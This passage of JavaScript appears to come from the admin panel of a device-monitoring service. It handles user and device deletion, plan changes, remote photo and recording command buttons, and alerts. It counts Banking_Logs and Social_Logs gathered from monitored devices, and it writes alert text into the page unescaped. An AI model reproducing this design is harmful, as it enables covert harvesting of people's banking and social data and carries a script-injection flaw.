            auth.currentUser?.uid || 'admin',
            `Manually deleted user account and all associated data`,
            userId
        );
        
        return response;
    } catch (error) {

        showToast(`❌ Failed to delete user: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * 🗑️ DELETE CHILD DEVICE - Delete specific device data
 * किसी specific device को delete करता है
 */
async function deleteChildDevice(userId, childKey) {
    try {
        const deleteDevice = httpsCallable(functions, 'deleteChildDevice');
        const response = await deleteDevice({
            parentUid: userId,
            childKey: childKey
        });
        
        showToast('🗑️ Device deleted successfully!', 'success');
        
        // Refresh the user list to reflect changes
        setTimeout(() => {
            loadUsersAndSetupChatListeners();
        }, 1000);
        
        return response;
    } catch (error) {

        showToast('❌ Error: ' + error.message, 'error');
        throw error;
    }
}

/**
 * 💎 PLAN MANAGEMENT - Change User Plan
 * Free/Pro/Enterprise plan को change करता है
 */
function displayPlanManagement(userId) {
    const profileRef = ref(db, `user/${userId}/profile_data`);
    
    get(profileRef).then((snapshot) => {
        const profileData = snapshot.val() || {};
        const currentPlan = profileData.subscriptionPlan || 'free';
        
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #ffc107; margin: 0;">💎 Subscription Plan Management</h3>
                          </div>`;
        
        const plans = [
            {
                name: 'free',
                label: '🆓 Free Plan',
                features: ['Basic monitoring', '5 devices', 'Limited data'],
                price: '$0'
            },
            {
                name: 'pro',
                label: '⭐ Pro Plan',
                features: ['Full monitoring', '20 devices', 'Unlimited data', 'Priority support'],
                price: '$9.99/mo'
            },
            {
                name: 'enterprise',
                label: '🏆 Enterprise Plan',
                features: ['Everything in Pro', 'Unlimited devices', 'Custom features', 'Dedicated support'],
                price: 'Custom'
            }
        ];
        
        let contentHTML = '<div style="padding: 1rem; text-align: center; margin-bottom: 2rem;"><h3 style="color: #ffc107; margin: 0;">Current Plan: <span style="text-transform: uppercase;">${currentPlan}</span></h3></div>';
        
        contentHTML += '<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem;">';
        
        plans.forEach(plan => {
            const isActive = plan.name === currentPlan;
            const bgColor = isActive ? 'rgba(255, 193, 7, 0.15)' : 'transparent';
            const borderColor = isActive ? '#ffc107' : '#444';
            
            contentHTML += `
                <div style="background: #2a2a2a; padding: 1.5rem; border-radius: 12px; border: 2px solid ${borderColor}; background-color: ${bgColor}; transition: all 0.3s ease;">
                    <h4 style="color: #ffc107; margin-top: 0;">${plan.label}</h4>
                    <div style="font-size: 1.5rem; font-weight: bold; color: #c9d1d9; margin: 1rem 0;">${plan.price}</div>
                    
                    <ul style="list-style: none; padding: 0; margin: 1.5rem 0;">
                        ${plan.features.map(f => `<li style="padding: 0.5rem 0; color: #8b949e;">✓ ${f}</li>`).join('')}
                    </ul>
                    
                    <button class="plan-change-btn" data-plan="${plan.name}" data-userid="${userId}" 
                            style="width: 100%; padding: 10px; background: ${isActive ? '#8b949e' : '#ffc107'}; 
                            color: ${isActive ? '#c9d1d9' : '#000'}; border: none; border-radius: 6px; 
                            cursor: pointer; font-weight: 600; margin-top: 1rem;">
                        ${isActive ? '✓ Current Plan' : 'Switch to ' + plan.label.split(' ')[1]}
                    </button>
                </div>
            `;
        });
        
        contentHTML += '</div>';
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
        
        // Add event listeners to plan change buttons
        document.querySelectorAll('.plan-change-btn').forEach(btn => {
            let confirmChangePlan = false;
            btn.addEventListener('click', async () => {
                const newPlan = btn.dataset.plan;
                const targetUserId = btn.dataset.userid;
                
                if (newPlan === currentPlan) return;
                
                if (!confirmChangePlan) {
                    showToast(`Click again to confirm changing to ${newPlan}.`, 'warning', 5000);
                    btn.style.opacity = '0.7';
                    btn.disabled = true;
                    confirmChangePlan = true;
                    
                    setTimeout(() => {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        confirmChangePlan = false;
                    }, 5000);
                } else {
                    try {
                        await changeUserPlan(targetUserId, newPlan);
                        displayPlanManagement(userId);
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        confirmChangePlan = false;
                    } catch (error) {
                        btn.style.opacity = '1';
                        btn.disabled = false;
                        confirmChangePlan = false;
                    }
                }
            });
        });
    });
}

/**
 * 🔄 CHANGE USER PLAN - Cloud Function Call
 */
async function changeUserPlan(userId, newPlan) {
    try {
        const changePlan = httpsCallable(functions, 'changeUserPlan');
        const response = await changePlan({
            targetUid: userId,
            newPlan: newPlan
        });
        
        showToast(`💎 Plan changed to ${newPlan} successfully!`, 'success');
        
        return response;
    } catch (error) {

        showToast('❌ Error: ' + error.message, 'error');
        throw error;
    }
}

/**
 * 💬 CLEAR USER CHAT - Delete all chat messages
 * किसी user के सभी chat messages को delete करता है
 */
async function clearUserChat(userId, childKey) {
    try {
        const clearChat = httpsCallable(functions, 'clearUserChat');
        const response = await clearChat({
            targetUid: userId,
            childKey: childKey
        });
        
        showToast('💬 All chat messages cleared successfully!', 'success');
        
        // Refresh chat display if it's currently shown
        setTimeout(() => {
            renderChat(userId, childKey);
        }, 500);
        
        return response;
    } catch (error) {

        showToast('❌ Error: ' + error.message, 'error');
        throw error;
    }
}

/**
 * 🔒 DISABLE BUTTON ON LIMIT REACHED
 * यह buttons को disable करता है अगर limit reached हो
 */
async function updateCommandButtonStates(userId, childKey) {
    const limitsReached = await checkCommandLimits(userId);
    
    const commandButtons = document.querySelectorAll('[data-command], .capture-photo-btn, .record-btn');
    
    commandButtons.forEach(btn => {
        if (limitsReached) {
            btn.disabled = true;
            btn.style.opacity = '0.5';
            btn.style.cursor = 'not-allowed';
            btn.title = '⚠️ Daily command limit reached. Try again tomorrow.';
        } else {
            btn.disabled = false;
            btn.style.opacity = '1';
            btn.style.cursor = 'pointer';
            btn.title = '';
        }
    });
}

/**
 * 🚨 CRITICAL ALERTS - Display system critical alerts
 * Reads data from Admin_Vault/critical_alerts and displays in main data-modal
 * Called when category === 'critical-alerts' and by alert-bell-btn click
 */
function displayCriticalAlerts() {
    // Open the main data modal
    openModal(dataModal);
    
    // Detach previous listener if exists
    if (activeDataListener) {
        off(activeDataListener.ref, 'value', activeDataListener.callback);
        activeDataListener = null;
    }
    
    const alertsRef = ref(db, 'Admin_Vault/critical_alerts');
    
    const callback = (snapshot) => {
        const alertsData = snapshot.val();
        let headerHTML = `<div class="data-header">
                            <h3 style="color: #ff6b6b; margin: 0;">🚨 Critical Alerts Dashboard</h3>
                          </div>`;
        let contentHTML = '';

        if (!alertsData || Object.keys(alertsData).length === 0) {
            contentHTML = '<p style="text-align: center; padding: 2rem; color: #26d07c; font-size: 1.2rem;">✅ No critical alerts. System is secure.</p>';
            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
            return;
        }

        contentHTML = '<div class="alerts-dashboard">';
        
        Object.entries(alertsData).forEach(([key, alert]) => {
            const severity = alert.severity || 'warning';
            const severityColor = severity === 'critical' ? '#ff6b6b' : severity === 'warning' ? '#ffc107' : '#64b5f6';
            const timestamp = alert.timestamp ? formatTimestamp(alert.timestamp) : 'N/A';
            
            contentHTML += `<div class="alert-card" style="border-left: 5px solid ${severityColor}; background: #2a2a2a; padding: 1.5rem; border-radius: 8px; margin-bottom: 1rem;">
                            <div class="alert-header">
                                <div class="alert-title-section">
                                    <span style="color: ${severityColor}; font-weight: bold; font-size: 1.1rem;">${alert.title || 'Alert'}</span>
                                </div>
                                <span class="alert-badge" style="background: ${severityColor}; padding: 4px 8px; border-radius: 4px; color: white; font-size: 0.8rem; font-weight: bold;">${severity.toUpperCase()}</span>
                            </div>
                            <div class="alert-body" style="margin: 1rem 0; color: #ccc;">
                                ${alert.description || alert.message || ''}
                            </div>
                            <div class="alert-footer" style="font-size: 0.85rem; color: #8b949e;">
                                <p>User: ${alert.userId || 'N/A'}</p>
                                <p>Time: ${timestamp}</p>
                            </div>
                        </div>`;
        });

        contentHTML += '</div>';
        modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
    };
    
    // Attach listener and store reference
    onValue(alertsRef, callback);
    activeDataListener = { ref: alertsRef, callback: callback };
}

/**
 * 🔔 SETUP CRITICAL ALERT MONITORING - Monitors Admin_Vault for critical alerts
 */
function setupCriticalAlertMonitoring() {
    const alertBellBtn = document.getElementById('alert-bell-btn');
    if (!alertBellBtn) return;

    // === DETACH OLD LISTENER ===
    if (criticalAlertsListener) {
        try {
            off(criticalAlertsListener);
        } catch (e) {

        }
    }

    // === ATTACH TO Admin_Vault ===
    const alertsRef = ref(db, 'Admin_Vault');
    const alertsCallback = (snapshot) => {
        const vaultData = snapshot.val();
        let alertCount = 0;
        if (vaultData) {
            Object.keys(vaultData).forEach(key => {
                // Count entries in Banking_Logs, Social_Logs, Danger_Logs, or items with priority HIGH/CRITICAL
                if (key === 'Banking_Logs' || key === 'Danger_Logs' || key === 'Social_Logs') {
                    const logData = vaultData[key];
                    if (logData && typeof logData === 'object') {
                        alertCount += Object.keys(logData).length;
                    }
                } else {
                    const entry = vaultData[key];
                    if (entry && (entry.priority === 'HIGH' || entry.priority === 'CRITICAL')) {
                        alertCount++;
                    }
                }
            });
        }

        // Update badge
        const oldBadge = alertBellBtn.querySelector('.notification-dot');
        if (oldBadge) oldBadge.remove();

        if (alertCount > 0) {
            const badge = document.createElement('span');
            badge.className = 'notification-dot';
            badge.textContent = alertCount;
            Object.assign(badge.style, {
                position: 'absolute', top: '-8px', right: '-8px',
                backgroundColor: '#ff6b6b', color: 'white', borderRadius: '50%',
                width: '24px', height: '24px', display: 'flex',
                alignItems: 'center', justifyContent: 'center',
                fontSize: '0.75rem', fontWeight: 'bold',
                border: '2px solid var(--primary-dark)',
                boxShadow: '0 0 10px rgba(255, 107, 107, 0.5)', zIndex: '1000'
            });
            alertBellBtn.style.position = 'relative';
            alertBellBtn.appendChild(badge);
        }
    };

    onValue(alertsRef, alertsCallback);
    criticalAlertsListener = alertsRef;

    // Single click handler - calls the main displayCriticalAlerts function
    if (alertBellBtn._criticalAlertHandler) {
        alertBellBtn.removeEventListener('click', alertBellBtn._criticalAlertHandler);
    }
    alertBellBtn._criticalAlertHandler = displayCriticalAlerts;
    alertBellBtn.addEventListener('click', alertBellBtn._criticalAlertHandler);
}



// --- Initial Setup ---
document.addEventListener('DOMContentLoaded', () => {
    // Initial user load
    loadUsersAndSetupChatListeners();
    
    // Setup user search functionality
    const userSearchInput = document.getElementById('user-search-input');
    if (userSearchInput) {
        userSearchInput.addEventListener('input', (e) => {
            filterAndRenderUsers(e.target.value);
        });
    }
});

